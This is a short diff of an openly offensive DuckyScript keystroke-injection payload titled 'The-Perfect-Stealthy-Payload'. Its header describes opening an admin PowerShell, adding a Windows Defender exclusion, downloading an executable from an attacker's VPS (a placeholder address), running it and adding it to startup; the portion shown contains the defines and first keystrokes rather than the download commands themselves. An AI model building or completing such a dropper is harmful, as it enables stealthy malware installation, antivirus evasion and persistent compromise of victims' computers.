@@ -1,4 +1,4 @@
-REM Title: Cache Folder Exclusion & Payload Download + Persistence
+REM Title: The-Perfect-Stealthy-Payload
 REM Author: zb0r
 REM Description: Opens PowerShell as admin, creates a folder in Windows/temp called Cache, adds exclusion in Defender, downloads the payload from VPS/ inside the Cache folder, executes it, and adds it to startup
 REM Target: Windows
@@ -7,7 +7,7 @@ REM Note: replace VPSIPHERE with the IP of your VPS and the correct port (ex:444
 REM Version: 1.0
 DEFINE #VPSISHERE 0.0.0.0
 DEFINE #EXE_NAME Shelzy.exe
-PASSIVE_WINDOWS_DETECT
+EXTENSION PASSIVE_WINDOWS_DETECT
 DELAY 100
 GUI r
 DELAY 500
